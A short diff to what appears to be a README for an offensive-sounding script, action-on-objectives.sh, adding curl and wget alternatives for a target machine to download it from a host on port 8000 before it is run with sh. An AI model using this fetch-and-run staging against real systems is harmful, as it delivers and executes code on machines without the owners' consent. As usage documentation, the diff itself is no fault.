@@ -23,7 +23,9 @@ Local network:
 # Host
 sh action-on-objectives.sh -w
 # Target
-curl -LJO <Host>:8000/action-on-objectives.sh
+curl -LJO <Host>:8000/action-on-objectives.sh #or
+curl <Host>:8000/action-on-objectives.sh > action-on-objectives.sh #or
+wget <Host>:8000/action-on-objectives.sh
 sh action-on-objectives.sh -h
 ```
 
